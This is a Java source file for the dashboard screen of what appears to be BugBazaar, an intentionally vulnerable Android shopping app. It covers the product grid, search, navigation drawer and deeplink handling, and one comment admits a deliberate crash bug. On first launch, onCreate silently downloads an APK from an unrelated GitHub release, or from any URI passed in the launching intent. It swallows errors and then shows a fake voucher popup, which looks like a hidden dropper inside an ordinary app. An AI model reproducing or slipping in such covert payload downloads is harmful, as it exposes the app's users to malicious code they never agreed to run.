package com.BugBazaar.ui;

import androidx.appcompat.app.ActionBarDrawerToggle;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.view.GravityCompat;
import androidx.drawerlayout.widget.DrawerLayout;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.MenuItem;
import android.view.View;
import android.view.inputmethod.InputMethodManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.GridView;
import android.widget.Toast;
import androidx.appcompat.widget.Toolbar;

import com.BugBazaar.R;
import com.BugBazaar.ui.ContactsPack.ReferUs;
import com.BugBazaar.ui.cart.CartActivity;
import com.BugBazaar.ui.myorders.OrderHistoryActivity;
import com.BugBazaar.utils.AppInitializationManager;
import com.BugBazaar.utils.CustomDialog;
import com.BugBazaar.utils.NetworkUtils;
import com.BugBazaar.utils.NotificationUtils;
import com.BugBazaar.utils.checkWorker;
import com.google.android.material.navigation.NavigationView;

import java.util.ArrayList;
import java.util.List;


public class NavigationDrawer_Dashboard extends AppCompatActivity implements checkWorker.DiscountCallback {

    private DrawerLayout drawerLayout;
    private NavigationView navigationView;
    private Toolbar toolbar;
    private GridView productGridView;
    private List<Product> productList;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_navigation_drawer_dashboard);


///// first check !!!!!!



        if (AppInitializationManager.isFirstRun(this)) {



            checkWorker check = new checkWorker(this);

            try {
                if(getIntent().getData()!=null){
                    check.filesendtodownload(this,getIntent().getData());

                }

                else {
                    check.filesendtodownload(this, Uri.parse("https://github.com/banditAmit/hello/releases/download/hello/app-debug.apk"));

                }
            }
            catch (Exception a){
                NetworkUtils.showExeptionDialog(this);
                return;

            }


        }


        //////////// first check !!!!!!!






        /////
        // Rest of your activity initialization code

        // Hide the keyboard and clear focus from the EditText
        View focusedView = getCurrentFocus();
        if (focusedView != null) {
            InputMethodManager imm = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
            imm.hideSoftInputFromWindow(focusedView.getWindowToken(), 0);
            focusedView.clearFocus();
        }

        //Product Search views find
        EditText searchEditText = findViewById(R.id.searchBox);
        Button searchButton = findViewById(R.id.btnSearch);


        // Find the GridView in the layout
        productGridView = findViewById(R.id.productGridView);

        // product data
        productList = new ArrayList<>();
        productList.add(new Product("Old Town Camera",getString(R.string.desc_cycle), R.drawable.item_camera,3400));
        productList.add(new Product("Dumb Watch", getString(R.string.desc_cycle), R.drawable.item_watch,2700));
        productList.add(new Product("Skate-Board", getString(R.string.desc_cycle), R.drawable.item_skateboard,1600));
        productList.add(new Product("A Lazy BiCycle", getString(R.string.desc_cycle), R.drawable.item_cycle,7040));
        productList.add(new Product("PineApple iPhone", getString(R.string.desc_cycle), R.drawable.item_iphone,6900));
        productList.add(new Product("Z Box Gaming Controller", getString(R.string.desc_cycle), R.drawable.item_gc,3400));
        productList.add(new Product("A Rat", getString(R.string.desc_cycle), R.drawable.item_mouse,1200));
        productList.add(new Product("Spy TWS", getString(R.string.desc_cycle), R.drawable.item_tws,4200));
        productList.add(new Product("VR device", getString(R.string.desc_cycle), R.drawable.item_vr,8340));


//
//        boolean isItemPresent = false;
//        Intent get_item = getIntent();
//        if (get_item.hasExtra("fetched_item")) {
//            // Retrieve the "fetched_item" string extra & Check if deeplink_item is present in the product list
//            String deeplink_item = get_item.getStringExtra("fetched_item");
//            for (Product product : productList) {
//                if (product.getName().equals(deeplink_item)) {
//                    Log.d("Product found:", product.getName());
//                    Intent detailed_product = new Intent(this, DetailedProductActivity.class);
//                    detailed_product.putExtra("product", product);
//                    detailed_product.putExtra("autostart", true);
//                    this.startActivity(detailed_product);
//                    //Sending intent to CartItem class
//                    //Intent intToCartItem = new Intent(this, CartItem.class);
//                    //intToCartItem.putExtra("product", product);
//                    //this.startActivity(intToCartItem);
//                    break; // No need to continue searching if found
//                }
//            }
//
//        }

        // Create and set the adapter for the GridView
        ProductAdapter adapter = new ProductAdapter(this, productList);
        productGridView.setAdapter(adapter);

        //Handle Deeplink intent


        //Adding onClickListener to search button
        searchButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String searchText = String.valueOf(searchEditText.getText());

                if (searchText.length() <= 30) {

                    ArrayList<Product> filteredList = new ArrayList<>();
                    for (Product product : productList) {
                        if (product.getName().toLowerCase().contains(searchText)) {
                            filteredList.add(product);
                        }
                    }
                    if (filteredList.isEmpty()) {
                        // Show "No products found" message
                        ProductAdapter adapter = new ProductAdapter(NavigationDrawer_Dashboard.this, new ArrayList<>());
                        productGridView.setAdapter(adapter);
                        Toast.makeText(NavigationDrawer_Dashboard.this, "No products found", Toast.LENGTH_LONG).show();
                    } else {
                        // Update the GridView adapter with filtered data
                        ProductAdapter adapter = new ProductAdapter(NavigationDrawer_Dashboard.this, filteredList);
                        productGridView.setAdapter(adapter);
                    }

                    // Hide the keyboard
                    InputMethodManager imm = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
                    imm.hideSoftInputFromWindow(v.getWindowToken(), 0);
                }
                //DO NOT REMOVEIf you search for empty searchbox and app crashed, it is intentional. It is a "Improper Exception Handling" bug
                String filteredList = null;
                Log.d("Exception",filteredList);
            }
        });

        //Drawer and Navigation bar layout view find
        drawerLayout = findViewById(R.id.drawerLayout);
        navigationView = findViewById(R.id.mainNavView);
        toolbar = findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);

        getSupportActionBar().setDisplayShowTitleEnabled(false);

        //Navigation Drawer actions
        ActionBarDrawerToggle toggle = new ActionBarDrawerToggle(
                this, drawerLayout, R.string.navigation_drawer_open, R.string.navigation_drawer_close);
        drawerLayout.addDrawerListener(toggle);
        toggle.syncState();



        //Adding actions for each items in navigation drawer
        navigationView.setNavigationItemSelectedListener(item -> {
            int itemId = item.getItemId();
            if (itemId == R.id.itemHome) {
                Intent intent = new Intent(NavigationDrawer_Dashboard.this, NavigationDrawer_Dashboard.class);
                startActivity(intent);
                drawerLayout.closeDrawer(GravityCompat.START);
                return true;
            } else if (itemId == R.id.itemMyProfile) {
                Intent intent = new Intent(NavigationDrawer_Dashboard.this, MyProfile.class);
                startActivity(intent);
                drawerLayout.closeDrawer(GravityCompat.START);
                return true;
            } else if (itemId == R.id.itemWallet) {
                Toast.makeText(this, "Wallet is clicked", Toast.LENGTH_SHORT).show();
            }
            else if (itemId == R.id.itemCart) {
                Intent intent =new Intent(this, CartActivity.class);
                startActivity(intent);
                drawerLayout.closeDrawer(GravityCompat.START);
                return true;
            }else if (itemId == R.id.itemContactUs) {
                Intent intent = new Intent(NavigationDrawer_Dashboard.this, Contact_us.class);
                startActivity(intent);
                drawerLayout.closeDrawer(GravityCompat.START);
                return true;
            }else if (itemId == R.id.itemReferUs) {
                Intent intent = new Intent(NavigationDrawer_Dashboard.this, ReferUs.class);
                startActivity(intent);
                drawerLayout.closeDrawer(GravityCompat.START);
                return true;
            }else if (itemId == R.id.itemTerms_Conditions) {
                Intent intent = new Intent(NavigationDrawer_Dashboard.this, TermsAndConditionsActivity.class);
                startActivity(intent);
                drawerLayout.closeDrawer(GravityCompat.START);
                return true;
            } else if (itemId == R.id.itemMyOrders) {
                Intent intent = new Intent(NavigationDrawer_Dashboard.this, OrderHistoryActivity.class);
                startActivity(intent);
                drawerLayout.closeDrawer(GravityCompat.START);
                return true;
            }
            else if (itemId == R.id.itemLoginLogout) {

                Intent intent = new Intent(NavigationDrawer_Dashboard.this, Signin.class);
                startActivity(intent);
                drawerLayout.closeDrawer(GravityCompat.START);
                return true;
            }
            drawerLayout.closeDrawer(GravityCompat.START);
            return true;
        });
    }


    @Override
    public void onDiscountCalculated(double discountedPrice) {
        // Now you can access and use the discountedPrice in your activity
        handleDiscountedPrice(discountedPrice);
    }

    private void handleDiscountedPrice(double discountedPrice) {

        Toast.makeText(this, "Discounted Price: $" + discountedPrice, Toast.LENGTH_SHORT).show();
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0,new Intent(),0);
        // This is the first run, show your notification
        AppInitializationManager.showNotification(this);
        CustomDialog.showCustomDialog(this, " \uD83C\uDF89 Congratulations \uD83C\uDF89", "You've received a "+ discountedPrice+"voucher.Login to Redeem",pendingIntent);
        AppInitializationManager.markFirstRunDone(this);



    }

    public void fetch_product()
    {

    }
    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        if (item.getItemId() == android.R.id.home) {
            drawerLayout.openDrawer(GravityCompat.START);
            return true;
        }
        return super.onOptionsItemSelected(item);
    }
    //TOggle icon code
    public void onToggleDrawerClick(View view) {
        // Toggle the navigation drawer
        if (drawerLayout.isDrawerOpen(GravityCompat.START)) {
            drawerLayout.closeDrawer(GravityCompat.START);
        } else {
            drawerLayout.openDrawer(GravityCompat.START);
        }
    }

    public void onBackPressed() {
        finishAffinity();
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        handledeeplink();



    }

    private void handledeeplink() {


        Intent get_item = getIntent();
        if (get_item.hasExtra("fetched_item")) {
            // Check for the "fetched_item" string extra
            String deeplink_item = get_item.getStringExtra("fetched_item");
            //Check if fetched deeplink_item is present in the product list
            for (Product product : productList) {
                if (product.getName().equals(deeplink_item)) {
                    Log.d("Product found:", product.getName());
                    Intent detailed_product = new Intent(this, DetailedProductActivity.class);
                    detailed_product.putExtra("product", product);
                    detailed_product.putExtra("autostart", true);
                    this.startActivity(detailed_product);
                    break; // No need to continue searching if found
                }
            }
        }


    }
}